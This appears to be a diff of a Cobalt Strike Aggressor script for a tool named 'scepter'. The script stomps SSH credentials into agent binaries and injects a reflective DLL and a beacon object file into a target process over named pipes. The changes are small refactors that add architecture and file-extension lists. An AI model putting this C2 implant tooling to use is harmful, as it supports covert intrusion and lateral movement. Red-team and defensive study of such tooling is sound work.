@@ -1,6 +1,6 @@
 import beacon.CommandBuilder;
 
-global('$ssh_inited $server_dll_name $pipe_wait $pipe_output_name_final $agent_base_name $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_ip_connect_stomp_me $ssh_port_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
+global('$ssh_inited $server_dll_name $pipe_wait $arch_list $file_ext $pipe_output_name_final $agent_base_name $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_ip_connect_stomp_me $ssh_port_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
 $ssh_inited = -1;
 
 # GLOBALS
@@ -31,9 +31,10 @@ $server_dll_name = "scepter_server.shc.windows.x64.dll"; # default name
 $bof_write_pipe_name  = "bof_write_pipe.x64.o";
 $agent_base_name = "scepter-agent";
 
-# Declare the list of strings
+# Declare the lists of strings
 $os_list = @("linux", "windows", "apple")
 $arch_list = @("aarch64", "x64")
+$file_ext = @(".exe", "dll", ".bin")
 
 # $1 - bytes where we are going to do the stoming
 # $2 - string we want to stomp
@@ -77,7 +78,7 @@ sub stomp-str {
 # $4 - password
 # $5 - process id of injection target (optional)
 alias ssh-init {
-    local('$barch $beacon_id $pid $rdll_path $target_ip $target_port $target_username $agent_path $target_password $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name $bof_path $bof_data');
+    local('$barch $beacon_id $pid $agent_path $agent_path_out $rdll_path $rdll_path_out $target_ip $target_port $target_username $target_password $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name $bof_path $bof_path_out $bof_data');
     $beacon_id = $1;
     $target_ip = $2; # ssh server ip
     $target_port = $3 # ssh server port
@@ -113,7 +114,9 @@ alias ssh-init {
     $bof_path = getFileProper(script_resource("."), "bins", "x64", $bof_write_pipe_name);
 
     # For *every* agent we need to stomp in server IP, PORT, username, and password
-    $agent_path = getFileProper(script_resource("."), "bins", "x64", $agent_base_name);
+    # $agent_path = getFileProper(script_resource("."), "bins", "x64", $agent_base_name); # TODO loop through this one with all the list
+
+    # Resolve the output directories now as well
 
     # Get rdll contents
     $handle = openf($rdll_path);
